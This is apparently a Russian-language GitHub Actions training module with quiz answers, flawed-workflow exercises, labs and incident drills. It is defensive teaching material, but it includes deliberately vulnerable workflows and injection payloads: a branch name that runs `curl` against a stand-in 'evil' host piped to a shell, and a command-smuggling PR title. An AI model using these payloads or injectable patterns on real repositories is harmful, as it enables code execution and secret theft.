**A9.** Какие настройки есть у environment? Чем environment secrets отличаются от repo secrets?

<details><summary>Ответ</summary>

Required reviewers (+ prevent self-review), wait timer, deployment branches and tags,
environment secrets/vars, кастомные protection rules. Environment secrets видит только джоба
с этим `environment:` и только после прохождения правил; repo secrets — любая джоба (кроме PR из форков).

</details>

**A10.** Почему `GITHUB_TOKEN` не подходит для коммита в gitops-репо? Три альтернативы — какая лучшая?

<details><summary>Ответ</summary>

`GITHUB_TOKEN` выдаётся только на текущий репо. Лучший вариант — токен GitHub App
(на час, только на нужный репо, не человек); deploy key — долгоживущий ключ; fine-grained PAT —
привязан к человеку и уходит вместе с ним.

</details>

**A11.** Reusable workflow vs composite action: четыре отличия. Где указывается `environment` и почему?

<details><summary>Ответ</summary>

Reusable — целые джобы со своими `runs-on`/`environment`, вызов в `jobs.<id>.uses`,
`secrets: inherit`, в UI — отдельные джобы. Composite — шаги в чужой джобе, вызов в `steps`,
секреты только через `inputs`, `shell:` обязателен. `environment` — в джобе **внутри** reusable:
у вызывающей джобы с `uses:` такого ключа нет, и секреты окружения берутся там, где он объявлен.

</details>

**A12.** Шаги настройки OIDC GitHub Actions → AWS. Зачем `id-token: write`? Какой `aud` проверяется?

<details><summary>Ответ</summary>

(1) IAM OIDC provider `https://token.actions.githubusercontent.com`, audience
`sts.amazonaws.com`; (2) роль: `Federated` на провайдер, `sts:AssumeRoleWithWebIdentity`, условия
по `aud` и `sub`; (3) в джобе `id-token: write` (без него GitHub не выдаст JWT) и
`configure-aws-credentials` с `role-to-assume`. `aud` = `sts.amazonaws.com`.

</details>

**A13.** Формат `sub` для ветки, тега, джобы с environment и PR. Что изменилось для репо после 15.07.2026?

<details><summary>Ответ</summary>

`repo:org/repo:ref:refs/heads/main`; `repo:org/repo:ref:refs/tags/v1.2.0`;
`repo:org/repo:environment:production` (ref исчезает); `repo:org/repo:pull_request`. Репо,
созданные/переименованные/перенесённые после 15.07.2026, получают immutable subject с ID:
`repo:org@123/repo@456:…`; старые — по опт-ину.

</details>

**A14.** Что такое ARC, из чего состоит, как ставится и как сослаться на него из `runs-on`?

<details><summary>Ответ</summary>

Оператор k8s: контроллер + listener на каждый scale set + эфемерные поды-раннеры.
Два Helm-чарта из OCI: `gha-runner-scale-set-controller` и `gha-runner-scale-set`
(`githubConfigUrl`, `githubConfigSecret`, `minRunners`/`maxRunners`). В workflow — `runs-on: <installation>`.

</details>

**A15.** Почему self-hosted нельзя подключать к публичному репо? Четыре правила безопасности self-hosted.

<details><summary>Ответ</summary>

PR из форка выполнит код на твоём хосте — в твоей сети, с доступом к метаданным облака.
Правила: только приватные репо; эфемерные раннеры; runner groups с ограничением репо; на хосте
нет долгоживущих ключей (OIDC); изоляция сети и обновления.

</details>

**A16.** Что такое script injection? Какие поля событий недоверенные?

<details><summary>Ответ</summary>

<code v-pre>${{ }}</code> вклеивается в текст скрипта до shell, и данные события становятся кодом.
Недоверенное: title/body PR и issue, комментарии, `head_ref`, сообщения коммитов, имена/email
авторов, метки. Лечится `env:` + `"$VAR"`.

</details>

**A17.** Зачем пинить экшены по SHA? Что случилось с `tj-actions/changed-files`? Как жить с обновлениями?

<details><summary>Ответ</summary>

Тег изменяем: взломают мейнтейнера — тег перевесят. В марте 2025 теги `tj-actions/changed-files`
указали на вредоносный коммит, печатавший секреты в логи тысяч репо. SHA неизменяем; обновления —
Dependabot (`github-actions`) с комментарием версии; политика обязательного SHA-пиннинга (август 2025).

</details>

**A18.** Как включить debug-логи? Что умеет `act` и чего не умеет?

<details><summary>Ответ</summary>

Re-run with debug logging или `ACTIONS_STEP_DEBUG=true` (`ACTIONS_RUNNER_DEBUG` — раннер).
`act` гоняет джобы в Docker локально — хорошо для `run:`-логики; нет OIDC, environments, тех же
образов, полноценного кэша/артефактов, `GITHUB_TOKEN` без явной передачи.

</details>

---

### Блок B. «Что тут не так»

Для каждого фрагмента: найди проблему, объясни последствия, исправь.

```yaml
# B1
jobs:
  test:
    runs-on: ubuntu-24.04
    steps: [{ uses: actions/checkout@v7 }, { run: python -m unittest discover -s tests }]
  deploy:
    runs-on: ubuntu-24.04
    steps:
      - run: ./deploy.sh production
```

<details><summary>Ответ</summary>

Нет `needs: test` и условия: деплой идёт параллельно с тестами на любом событии, включая PR;
нет checkout (скрипта в джобе нет). Нужно: checkout, `needs: test`, `if: github.ref == 'refs/heads/main'`,
`environment: production`, `concurrency`.

</details>

```yaml
# B2
on: pull_request
jobs:
  greet:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Ветка ${{ github.head_ref }} — ${{ github.event.pull_request.title }}"
```

<details><summary>Ответ</summary>

Script injection: ветку и заголовок контролирует автор PR (ветка `x;curl${IFS}evil|sh`
выполнится). Исправить: <code v-pre>env: { HEAD: "${{ github.head_ref }}", TITLE: "…" }</code> и `echo "Ветка $HEAD — $TITLE"`.

</details>

```yaml
# B3
on: pull_request_target
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with: { ref: "${{ github.event.pull_request.head.sha }}" }
      - run: pip install -r requirements.txt && python -m unittest
        env: { PYPI_TOKEN: "${{ secrets.PYPI_TOKEN }}" }
```

<details><summary>Ответ</summary>

Pwn request: `pull_request_target` (секреты + write-токен) + checkout кода PR + `pip install` —
код форка получает `PYPI_TOKEN` и `write-all`. Тесты — на `pull_request` без секретов;
`pull_request_target` — только метаданные, минимальные `permissions`. Checkout `v7` такое отклоняет.

</details>

```yaml
# B4  (приватный репозиторий)
permissions: { contents: read }
jobs:
  build:
    runs-on: ubuntu-24.04
    permissions: { packages: write }
    steps:
      - uses: actions/checkout@v7
```

<details><summary>Ответ</summary>

`permissions` джобы **заменяет** workflow-уровень: `contents` стал `none`, checkout
приватного репо упадёт. Нужно `{ contents: read, packages: write }`.

</details>

```json
// B5 — trust policy роли; джоба деплоя объявляет environment: production
"Condition": {
  "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" },
  "StringLike":   { "token.actions.githubusercontent.com:sub": "repo:acme/linkd:ref:refs/heads/main" }
}
```

<details><summary>Ответ</summary>

Джоба с `environment: production` получает `sub = repo:acme/linkd:environment:production` —
условие с `ref:` не совпадёт → `Not authorized to perform sts:AssumeRoleWithWebIdentity`. `StringLike`
без масок бессмысленен, с масками (`repo:acme/*`) опасно широк. Нужен `StringEquals` на
`…:environment:production` (для нового репо — формат с ID).

</details>

```yaml
# B6  (публичный репозиторий)
on: pull_request
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/checkout@v7
      - uses: tj-actions/changed-files@v46
```

<details><summary>Ответ</summary>

Self-hosted на публичном репо + `pull_request`: любой форк выполнит код на твоём хосте.
Сторонний экшен по тегу — ровно тот, что скомпрометировали в 2025. Нужно: hosted-раннер,
экшен по SHA (или `git diff --name-only` вместо него).

</details>

```yaml
# B7
on:
  schedule:
    - cron: "0 9 * * *"      # «каждый день в 9 утра по Алматы»
jobs:
  report:
    runs-on: ubuntu-24.04
    if: !cancelled()
    steps:
      - run: ./nightly-report.sh
```

<details><summary>Ответ</summary>

(1) cron в UTC: 9:00 UTC — это 14:00 по Алматы (с марта 2024 весь Казахстан в UTC+5);
для 9:00 местного — `0 4 * * *`. (2) `if: !cancelled()` без <code v-pre>${{ }}</code> — ошибка YAML (`!` — тег).
(3) Нет `timeout-minutes` (360 по умолчанию) и checkout. Schedule идёт только из default branch.

</details>

```yaml
# B8
jobs:
  deploy:
    environment: production
    uses: ./.github/workflows/deploy-gitops.yml
    with: { environment: production, tag: "${{ needs.build.outputs.tag }}" }
```

<details><summary>Ответ</summary>

У джобы с `uses:` нет ключа `environment` — ошибка конфигурации; environment задаётся внутри
reusable. Нет `needs: build` (без него `needs.build.outputs` недоступен) и `secrets: inherit`.

</details>

```yaml
# B9
test:
  runs-on: ubuntu-24.04
  strategy: { matrix: { python: ["3.12", "3.13"] } }
  services:
    postgres:
      image: postgres:17
      env: { POSTGRES_PASSWORD: pass }
  env:
    LINKD_DATABASE_URL: postgresql://postgres:pass@postgres:5432/postgres
  steps:
    - uses: actions/checkout@v7
    - run: python -m coverage run -m unittest && python -m coverage xml
    - uses: actions/upload-artifact@v7
      with: { name: coverage, path: coverage.xml }
```

<details><summary>Ответ</summary>

Джоба на VM: хост `postgres` не резолвится — нужен `localhost` и `ports: ["5432:5432"]`;
нет `--health-cmd` — тесты стартуют раньше БД. Обе джобы матрицы грузят артефакт `coverage` —
имя неизменяемо, вторая упадёт; нужно имя вида `coverage-<matrix.python>`.

</details>

---

### Блок C. Практика

#### C1. 🔑 Перенос пайплайна

Возьми свой `.gitlab-ci.yml` из лабы 1 ([14. Практика: лабы](/cicd/14-practice-labs)) или проекта
`~/Projects/devops/05-conveyor` и напиши эквивалентный `.github/workflows/ci.yml`. Составь таблицу:
ключ GitLab → чем заменён в Actions → что пришлось сделать иначе.

<details><summary>Ответ</summary>

Критерий: зелёный пайплайн и таблица без «не знаю». Типичные открытия: стадии → `needs`,
`dotenv` → `outputs`, `when: manual` → environment с reviewers, `include` → reusable workflow,
`CI_REGISTRY_*` → GHCR + `GITHUB_TOKEN`.

</details>

#### C2. Тесты с PostgreSQL и матрицей

1. `test` с `services: postgres`, матрицей Python 3.12 / 3.13 и `LINKD_DATABASE_URL` из env.
2. Убери `--health-*` — упадут ли тесты на старте? Верни.
3. Ruleset на `main`: PR обязателен, required checks `lint`, `test (3.12)`, `test (3.13)`.
4. Переименуй ось матрицы — что случилось с PR? Почини.

<details><summary>Ответ</summary>

Без health-check первые подключения падают через раз. После переименования оси старый
required check не придёт никогда — PR висит в «Expected — Waiting for status»; обнови ruleset.

</details>

#### C3. Кэш

Замерь `pip install` без кэша и с `setup-python` + `cache: pip`; измени `requirements.txt` и
убедись, что ключ сменился (`gh cache list`); повтори с `actions/cache` + `restore-keys` и
добейся «частичного hit».

<details><summary>Ответ</summary>

Второй запуск заметно быстрее; новый `requirements.txt` — новый ключ; частичный hit —
точного ключа нет, найден кэш по префиксу, после успешной джобы сохранится кэш с полным ключом.

</details>

#### C4. Образ в GHCR

1. `build`: buildx, login `GITHUB_TOKEN`, metadata-action (`sha-…` + SemVer), кэш в registry.
2. Второй запуск без изменений: найди `CACHED`-слои, запиши время обеих сборок.
3. Поставь тег `v1.0.0` — появился ли образ `1.0.0`? Скачай образ с другой машины.

<details><summary>Ответ</summary>

Во втором запуске слои `CACHED`, сборка в разы быстрее; `v1.0.0` → образ `1.0.0` через
`type=semver`. Пакет приватный — pull с другой машины требует `docker login ghcr.io` с `read:packages`.

</details>

#### C5. GitOps-деплой с аппрувом

1. `linkd-gitops` с `apps/linkd/{staging,production}/values.yaml`.
2. GitHub App с `contents: write`, установленный **только** на `linkd-gitops`;
   client ID → `vars.GITOPS_APP_CLIENT_ID`, ключ → `secrets.GITOPS_APP_PRIVATE_KEY`.
3. Reusable `deploy-gitops.yml`, вызовы для staging (авто) и production.
4. Environment `production`: reviewers (себя; с одним аккаунтом prevent self-review не включай),
   deployment branches — только `main`.
5. Проверь: коммит сделан ботом App, в сообщении тег образа, прод ждал аппрува.

<details><summary>Ответ</summary>

В `linkd-gitops` коммит от `<app>[bot]`, прод ждал аппрува, в Environments — оба окружения.
Коммит `GITHUB_TOKEN`-ом → 403; App на все репо → нарушен least privilege.

</details>

#### C6. Composite action

Вынеси «setup-python + pip install» в `.github/actions/setup-linkd`, используй в `lint` и `test`.

<details><summary>Ответ</summary>

Джобы короче, в UI composite — один шаг. Без `shell: bash` у `run:` action не загрузится.

</details>

#### C7. OIDC в AWS (и Yandex Cloud по желанию)

1. OIDC provider + роль с trust на `environment:production` своего репо и правами только на
   `sts:GetCallerIdentity` / чтение одного бакета.
2. Джоба с `id-token: write` → `aws sts get-caller-identity` показывает assumed-role.
3. Сломай `sub` (поставь `ref:refs/heads/main`), запиши точный текст ошибки, почини.
4. Проверь формат `sub`: репо создан после 15.07.2026 — там числовые ID (`gh api repos/<you>/linkd --jq '.owner.id, .id'`).
5. *(Yandex Cloud)* Федерация `yc iam workload-identity oidc federation create`, federated credential
   на сервисный аккаунт, IAM-токен в джобе (шаг обмена — по документации YC).

<details><summary>Ответ</summary>

Ошибка при неверном `sub`: `Could not assume role with OIDC: Not authorized to perform
sts:AssumeRoleWithWebIdentity`. Диагностика — сравнить claims токена (вывести только payload,
не сам токен) или событие CloudTrail `AssumeRoleWithWebIdentity` с условиями trust policy.

</details>

#### C8. Харденинг

1. `permissions: contents: read` на workflow, расширения — только в нужных джобах.
2. Все экшены по SHA с комментарием версии (SHA тега — `git ls-remote --tags https://github.com/actions/checkout`).
3. `.github/dependabot.yml` для `github-actions`; дождись первого PR.
4. `actionlint` и `zizmor` — исправь найденное.
5. В песочном репо: <code v-pre>run: echo "${{ github.event.pull_request.title }}"</code>, PR с заголовком
   `x"; echo pwned; echo "` — выполнилось ли `pwned`? Исправь через `env:` и повтори.

<details><summary>Ответ</summary>

После `zizmor` нет findings уровня high. В демо injection `pwned` выполняется, а после
перехода на `env:` печатается как текст.

</details>

#### C9. ARC в kind

1. kind-кластер (при «too many open files» — `sudo sysctl fs.inotify.max_user_instances=512`).
2. Контроллер + scale set для **приватного** тестового репо (GitHub App), `minRunners: 0`, `maxRunners: 2`.
3. Джоба с `runs-on: <имя installation>`, смотри `kubectl get pods -n arc-runners -w`.
4. Матрица из 5 джоб — опиши поведение очереди.

<details><summary>Ответ</summary>

Под-раннер живёт одну джобу; при `maxRunners: 2` остальные ждут «Waiting for a runner»
и стартуют по мере освобождения.

</details>

---

### Блок D. Инциденты

**D1.** Джоба с `runs-on: [self-hosted, linux, gpu]` часами висит в «Waiting for a runner to pick up
this job…». Раннер в Settings виден. Что проверить?

<details><summary>Ответ</summary>

(1) Раннер offline/busy — статус в Settings → Actions → Runners, логи `_diag`; (2) не совпали
**все** метки (у раннера нет `gpu`); (3) runner group не разрешает этот репо/workflow; (4) раннер
зарегистрирован на другой репо/организацию; (5) ephemeral-раннер отработал и снялся, нового нет;
(6) ARC: `runs-on` ≠ имя installation, упал listener, исчерпан `maxRunners`, под не стартует
(ресурсы, образ) — `kubectl get pods -n arc-systems`, логи listener.

</details>

**D2.** Шаг `configure-aws-credentials` падает: `Could not assume role with OIDC: Not authorized
to perform sts:AssumeRoleWithWebIdentity`. Причины и порядок диагностики.

<details><summary>Ответ</summary>

(1) Нет `id-token: write` (или его перекрыл job-level `permissions`); (2) `sub` не совпал:
джоба с environment, а trust на `ref:`; (3) новый/переименованный репо — immutable `sub` с ID;
(4) другое имя/регистр org или repo, запуск из форка; (5) `aud` не `sts.amazonaws.com` или провайдер
в другом аккаунте / с другим URL; (6) неверный ARN роли. Порядок: `permissions` → claims токена →
сравнить с trust policy → CloudTrail.

</details>

**D3.** Кэш не попадает никогда: каждый запуск — `Cache not found for input keys: …`, установка
зависимостей идёт 4 минуты. Причины.

<details><summary>Ответ</summary>

(1) В ключе уникальное (`github.sha`, `run_id`, дата); (2) джоба всегда падает — кэш
не сохраняется; (3) кэш создаётся только в фича-ветках, а default branch его не пишет — соседние
ветки его не видят; (4) `path` ≠ куда реально ставятся пакеты; (5) `hashFiles` по несуществующему
файлу — пустая строка; (6) вытеснение (10 ГБ, 7 дней); (7) другая ОС/архитектура в ключе.
Проверка — `gh cache list` и лог шага cache.

</details>

**D4.** PR из форка: джоба превью-деплоя падает, `secrets.PREVIEW_TOKEN` пустой. Контрибьютор
просит «просто включите секреты для форков». Что ответишь и как решишь задачу правильно?

<details><summary>Ответ</summary>

Секреты в `pull_request` из форков не передаются намеренно — иначе любой форк украдёт их
одной строкой; `pull_request_target` с checkout кода PR — тот же слив. Правильно: тесты — без
секретов; превью — после ревью мейнтейнера (метка + отдельный workflow без исполнения кода PR,
или `workflow_run` над собранным артефактом, или деплой из ветки основного репо).

</details>

**D5.** Пуш образа падает: `denied: permission_denied: write_package` (или 403). Причины.

<details><summary>Ответ</summary>

(1) Нет `packages: write`; (2) имя не `ghcr.io/<owner>/…` или с заглавными; (3) пакет
уже существует и не даёт этому репо доступа Actions (настройки пакета); (4) PR из форка
(read-only токен); (5) организация запретила создание пакетов.

</details>

**D6.** `deploy-prod` всегда `skipped`, хотя `build` зелёный. Что может быть?

<details><summary>Ответ</summary>

(1) `if:` не совпал (`'main'` вместо `'refs/heads/main'`, запуск по тегу/PR); (2) одна из
`needs` пропущена/упала — зависимые пропускаются без `always()`/`!cancelled()`; (3) `deploy-staging`
skipped своим `if:`, и skip тянется дальше. Защита environment даёт не skip, а ошибку
«Branch … is not allowed to deploy to production due to environment protection rules».

</details>

**D7.** Ночной `schedule` перестал запускаться месяц назад, ошибок нет. Почему?

<details><summary>Ответ</summary>

(1) Публичный репо: schedule отключается после 60 дней без активности — включить в Actions;
(2) workflow изменён/удалён в default branch или default branch переименован; (3) ошибка в cron
(UTC); (4) Actions ограничены политикой; (5) запуски ровно в начале часа при нагрузке могут
пропускаться — ставь «нечётное» время.

</details>

**D8.** В логах джоб появились длинные base64-строки в шаге стороннего экшена, который ты не менял.
Немедленные действия и системные меры.

<details><summary>Ответ</summary>

Похоже на компрометацию экшена (как tj-actions): отключить workflow и запретить экшен
политикой (`!owner/action`), удалить логи, **ротировать все секреты**, доступные этим джобам,
проверить аудит/CloudTrail, найти последний безопасный SHA. Системно: пин по SHA, Dependabot
с cooldown, allowlist экшенов, минимальные `permissions`, OIDC вместо статичных ключей.

</details>

**D9.** Счёт за Actions в приватной организации вырос вдвое за месяц. Что проверить?

<details><summary>Ответ</summary>

Billing → Usage по репо/workflow; зависшие джобы без `timeout-minutes`; нет `cancel-in-progress`
и `paths-ignore`; Windows/macOS в матрицах; larger runners; частые schedule. Тяжёлое — на self-hosted/ARC.

</details>

---

### Блок E. Вопросы с собеседования

**1.** Чем GitHub Actions отличается от GitLab CI?

<details><summary>Ответ</summary>

Нет стадий (DAG через `needs`), каждая джоба — чистая VM, шаги — экшены, много workflow
со своими триггерами, права токена — `permissions`, environments с reviewers. Принципы те же.

</details>

**2.** Как бы ты перенёс пайплайн с GitLab CI на GitHub Actions?

<details><summary>Ответ</summary>

Инвентаризация ключей по таблице; стадии → `needs`, `rules` → `on`+`if`, секреты → secrets/
environments, `include` → reusable, registry → GHCR, раннеры → hosted/ARC; оба CI параллельно
до переключения со сверкой времени и результатов.

</details>

**3.** Как сделать деплой в прод с ручным подтверждением?

<details><summary>Ответ</summary>

Environment `production`: required reviewers, prevent self-review, deployment branches `main`,
секреты окружения; `concurrency` без отмены; ruleset на `main`; образ тот же, что на staging.

</details>

**4.** Как дать workflow доступ в AWS без ключей?

<details><summary>Ответ</summary>

OIDC: провайдер `token.actions.githubusercontent.com`, роль с `aud` и `sub` (environment/ветка),
`id-token: write`, `configure-aws-credentials`. Креды на час, секретов нет.

</details>

**5.** Что такое pwn request и как от него защититься?

<details><summary>Ответ</summary>

`pull_request_target` работает с секретами и write-токеном; запуск в нём кода PR = кража секретов.
Защита: не делать checkout кода PR, минимальные `permissions`, тесты — на `pull_request`,
checkout `v7` по умолчанию отклоняет такое, `zizmor` в CI.

</details>

**6.** Зачем пинить экшены по SHA и как с этим жить?

<details><summary>Ответ</summary>

Теги изменяемы, SHA — нет (tj-actions, 2025). Dependabot, политика обязательного SHA, allowlist.

</details>

**7.** Reusable workflow или composite action — когда что?

<details><summary>Ответ</summary>

Reusable — стандарт пайплайна из джоб (раннеры, environments, секреты); composite — общие шаги.

</details>

**8.** Как ускорить медленный workflow?

<details><summary>Ответ</summary>

Кэш зависимостей и слоёв (registry), `needs` вместо цепочки, матрица/шардирование, `paths`,
`cancel-in-progress`, `timeout-minutes`, образ только когда нужно, более мощные/arm-раннеры.

</details>

**9.** Когда нужны self-hosted раннеры и как сделать их безопасными?

<details><summary>Ответ</summary>

Внутренняя сеть, спецжелезо или объём, где дешевле своё. Безопасно: только приватные репо,
эфемерные раннеры (ARC), runner groups, изоляция сети, OIDC вместо ключей.

</details>

**10.** Как стандартизировать CI для 30 репозиториев на GitHub?

<details><summary>Ответ</summary>

`ci-templates` с reusable workflows и composite actions по SemVer-тегам, allowlist экшенов,
org-level rulesets и required checks, OIDC-роли по репо, ARC, Dependabot на всех репо.

</details>

---

### 🎯 Чек-лист

- [ ] Переношу любой ключ `.gitlab-ci.yml` на Actions по памяти (таблица §1 конспекта)
- [ ] Пайплайн linkd зелёный: lint → test (Postgres, матрица) → build (GHCR, кэш) → deploy (GitOps)
- [ ] Значения передаю через `outputs`, файлы — артефактами, кэш с ключом по `hashFiles`
- [ ] Прод защищён: environment с reviewers, deployment branches, `concurrency`, ruleset на `main`
- [ ] Коммит в gitops-репо делает GitHub App, а не `GITHUB_TOKEN` или личный PAT
- [ ] Есть reusable workflow и composite action, понимаю, когда что
- [ ] AWS (или Yandex Cloud) — по OIDC, знаю формат `sub` и immutable subject
- [ ] `permissions` минимальны, экшены по SHA, Dependabot для `github-actions`, `zizmor` чистый
- [ ] Могу объяснить pwn request и script injection и показать исправление
- [ ] Поднимал ARC в kind и видел, как появляются и исчезают эфемерные раннеры
